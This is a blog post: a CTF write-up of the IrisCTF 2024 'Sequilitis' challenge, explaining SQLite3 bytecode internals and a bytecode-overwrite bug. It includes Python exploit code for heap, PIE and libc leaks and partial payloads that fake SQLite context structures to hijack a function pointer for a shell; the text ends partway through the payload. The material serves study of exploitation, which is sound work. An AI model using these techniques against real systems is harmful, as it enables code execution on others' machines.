<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&amp;rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.
Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.'>
<title>IrisCTF 2024 - Sequilitis</title>

<link rel='canonical' href='https://sanjayvardhan.github.io/posts/irisctf-2024-sequilitis/'>

<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='IrisCTF 2024 - Sequilitis'>
<meta property='og:description' content='Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&amp;rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.
Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.'>
<meta property='og:url' content='https://sanjayvardhan.github.io/posts/irisctf-2024-sequilitis/'>
<meta property='og:site_name' content='spektre'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='IrisCTF2024' /><meta property='article:tag' content='Sqlite3' /><meta property='article:tag' content='Binary Exploitation' /><meta property='article:published_time' content='2024-01-30T14:02:58&#43;05:30'/><meta property='article:modified_time' content='2024-01-30T14:02:58&#43;05:30'/>
<meta name="twitter:title" content="IrisCTF 2024 - Sequilitis">
<meta name="twitter:description" content="Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&amp;rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.
Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.">
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "auto");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu57344d127bf18d6098b7d59f0847eb26_46956_300x0_resize_box_3.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">spektre</a></h1>
            <h2 class="site-description">CTF Player | Browser Exploitation</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/SanjayVardhan'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/0xspektre'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#introduction">Introduction</a></li>
        <li><a href="#sqlite3-internals">Sqlite3 Internals</a></li>
        <li><a href="#bug-analysis">Bug Analysis</a></li>
        <li><a href="#getting-leaks">Getting Leaks</a></li>
        <li><a href="#getting-rip-control">Getting RIP Control</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf-writeup/" >
                CTF Writeup
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/irisctf-2024-sequilitis/">IrisCTF 2024 - Sequilitis</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 30, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    6 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h3 id="introduction">Introduction</h3>
<p>I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.</p>
<h3 id="sqlite3-internals">Sqlite3 Internals</h3>
<p>SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.e., 6 ints. The opcode takes the first 4 bytes, and the arguments take the rest. To take a look at the bytecode, we can use the <code>Explain</code> keyword, which gives us the bytecode of the SQL statement instead of executing it in the VM.</p>
<p><img src="/IrisCTF2024/bytecode.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>You can take a look at all the opcodes <a class="link" href="https://www.sqlite.org/opcode.html#the_opcodes"  target="_blank" rel="noopener"
    >here</a>.</p>
<p>The challenge essentially involves four things:</p>
<ol>
<li>Adding a query.</li>
<li>Executing the query.</li>
<li>Deleting the query.</li>
<li>Exiting.</li>
</ol>
<p>The functionality is pretty straightforward, but there is a hidden function called <code>inscribe()</code>, which is where the bug lies.</p>
<h3 id="bug-analysis">Bug Analysis</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">inscribe</span><span class="p">(</span><span class="n">sqlite3_stmt</span> <span class="o">**</span><span class="n">stmt</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">stmt</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;There is no prepared statement at this location.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">int</span> <span class="n">amount</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">stmt</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tome</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">stmt</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;How many characters will you inscribe (up to %d)? &#34;</span><span class="p">,</span> <span class="n">amount</span> <span class="o">*</span> <span class="mi">24</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">actual</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">actual</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">if</span><span class="p">(</span><span class="n">actual</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">actual</span> <span class="o">&gt;</span> <span class="n">amount</span> <span class="o">*</span> <span class="mi">24</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Invalid amount.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Inscribe your message: &#34;</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">actual</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="n">tome</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
    <span class="o">++</span><span class="n">tome</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">It has been done.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>The function takes the query index as the input and then allows us to overwrite the bytecode of that query.</p>
<h3 id="getting-leaks">Getting Leaks</h3>
<p>We know from the bytecode that the engine only handles 32-bit values. But how does it handle values that exceed this limit? The answer is that it uses pointers instead. For the query <code>select 0x1122334455</code>, this is the memory layout of the bytecode:</p>
<p><img src="/IrisCTF2024/img1.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>It handles queries like <code>SELECT 1.1</code> in the same way.</p>
<p>Now, what if we overwrite the last byte of the pointer with an address that points to a heap location? This would result in a heap leak. By exploiting this heap leak, we can achieve arbitrary read access on the heap. Utilizing this, we can leak the PIE address and then leak the printf GOT to obtain the libc address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak_val</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
¬† ¬† <span class="n">bytecode</span> <span class="o">=</span> <span class="n">generate_opcode</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">243</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">addr</span>
¬† ¬† <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5</span><span class="se">\n</span><span class="s2">1</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">bytecode</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">());</span>
¬† ¬† <span class="n">sl</span><span class="p">(</span><span class="n">bytecode</span><span class="p">)</span>
¬† ¬† <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;It has been done.&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
¬† ¬† <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
¬† ¬† <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;? &#34;</span><span class="p">)</span>
¬† ¬† <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">rl</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">leak_val</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">-</span> <span class="mh">0xe008</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap --&gt; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>

<span class="n">baseleak</span> <span class="o">=</span> <span class="n">leak_val</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x640</span><span class="p">))</span>
<span class="n">base_addr</span> <span class="o">=</span> <span class="n">baseleak</span> <span class="o">-</span> <span class="mh">0xe3d87</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;base addr --&gt; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>

<span class="n">printf</span> <span class="o">=</span> <span class="n">leak_val</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x11aed8</span><span class="p">))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="mh">0x606f0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc --&gt; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>Now that we have all the leaks we need, We have to figure out how to get RIP control.</p>
<h3 id="getting-rip-control">Getting RIP Control</h3>
<p>After looking at the opcodes, We can see that <code>function</code> opcode can help us get RIP control.</p>
<p>Here is the opcode description for <code>Function</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Invoke a user function (P4 is a pointer to an sqlite3_context object that contains a pointer to the function to be run) with arguments taken from register P2 and successors. The number of arguments is in the sqlite3_context object that P4 points to. The result of the function is stored in register P3. Register P3 must not be one of the function inputs.&lt;br&gt;&lt;br&gt;P1 is a 32-bit bitmask indicating whether or not each argument to the function was determined to be constant at compile time. If the first argument was constant then bit 0 of P1 is set. This is used to determine whether meta data associated with a user function argument using the sqlite3_set_auxdata() API may be safely retained until the next invocation of this opcode.|
</code></pre></td></tr></table>
</div>
</div><p>Here are some useful structs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">sqlite3_context</span> <span class="p">{</span>
  <span class="n">Mem</span> <span class="o">*</span><span class="n">pOut</span><span class="p">;</span>              <span class="cm">/* The return value is stored here */</span>
  <span class="n">FuncDef</span> <span class="o">*</span><span class="n">pFunc</span><span class="p">;</span>         <span class="cm">/* Pointer to function information */</span>
  <span class="n">Mem</span> <span class="o">*</span><span class="n">pMem</span><span class="p">;</span>              <span class="cm">/* Memory cell used to store aggregate context */</span>
  <span class="n">Vdbe</span> <span class="o">*</span><span class="n">pVdbe</span><span class="p">;</span>            <span class="cm">/* The VM that owns this context */</span>
  <span class="kt">int</span> <span class="n">iOp</span><span class="p">;</span>                <span class="cm">/* Instruction number of OP_Function */</span>
  <span class="kt">int</span> <span class="n">isError</span><span class="p">;</span>            <span class="cm">/* Error code returned by the function. */</span>
  <span class="n">u8</span> <span class="n">enc</span><span class="p">;</span>                 <span class="cm">/* Encoding to use for results */</span>
  <span class="n">u8</span> <span class="n">skipFlag</span><span class="p">;</span>            <span class="cm">/* Skip accumulator loading if true */</span>
  <span class="n">u8</span> <span class="n">argc</span><span class="p">;</span>                <span class="cm">/* Number of arguments */</span>
  <span class="n">sqlite3_value</span> <span class="o">*</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="cm">/* Argument set */</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">FuncDef</span> <span class="p">{</span>
  <span class="n">i8</span> <span class="n">nArg</span><span class="p">;</span>             <span class="cm">/* Number of arguments.  -1 means unlimited */</span>
  <span class="n">u32</span> <span class="n">funcFlags</span><span class="p">;</span>       <span class="cm">/* Some combination of SQLITE_FUNC_* */</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">pUserData</span><span class="p">;</span>     <span class="cm">/* User data parameter */</span>
  <span class="n">FuncDef</span> <span class="o">*</span><span class="n">pNext</span><span class="p">;</span>      <span class="cm">/* Next function with same name */</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">xSFunc</span><span class="p">)(</span><span class="n">sqlite3_context</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">,</span><span class="n">sqlite3_value</span><span class="o">**</span><span class="p">);</span> <span class="cm">/* func or agg-step */</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">xFinalize</span><span class="p">)(</span><span class="n">sqlite3_context</span><span class="o">*</span><span class="p">);</span>                  <span class="cm">/* Agg finalizer */</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">xValue</span><span class="p">)(</span><span class="n">sqlite3_context</span><span class="o">*</span><span class="p">);</span>                     <span class="cm">/* Current agg value */</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">xInverse</span><span class="p">)(</span><span class="n">sqlite3_context</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">,</span><span class="n">sqlite3_value</span><span class="o">**</span><span class="p">);</span> <span class="cm">/* inverse agg-step */</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">zName</span><span class="p">;</span>   <span class="cm">/* SQL name of the function. */</span>
  <span class="k">union</span> <span class="p">{</span>
    <span class="n">FuncDef</span> <span class="o">*</span><span class="n">pHash</span><span class="p">;</span>      <span class="cm">/* Next with a different name but the same hash */</span>
    <span class="n">FuncDestructor</span> <span class="o">*</span><span class="n">pDestructor</span><span class="p">;</span>   <span class="cm">/* Reference counted destructor function */</span>
  <span class="p">}</span> <span class="n">u</span><span class="p">;</span> <span class="cm">/* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>If we fake these structures and overwrite the function pointer with a one_gadget, it will spawn a shell. To achieve this, we need to craft a fake <code>sqlite3_context</code> that points to a fake <code>FuncDef</code>. This <code>FuncDef</code> must contain the target pointer.</p>
<p>Fake sqlite3_context:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr1</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1">#FuncDef *pFunc; which is now our controlled pointer.</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr1</span><span class="o">+</span><span class="mh">0x64</span><span class="p">)</span> <span class="c1">#nulls</span>
</code></pre></td></tr></table>
</div>
</div><p>Fake FuncDef:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">oneGadget</span><span class="p">)</span> <span class="c1"># func* xSFunc --&gt; out target function ptr </span>
</code></pre></td></tr></table>
</div>
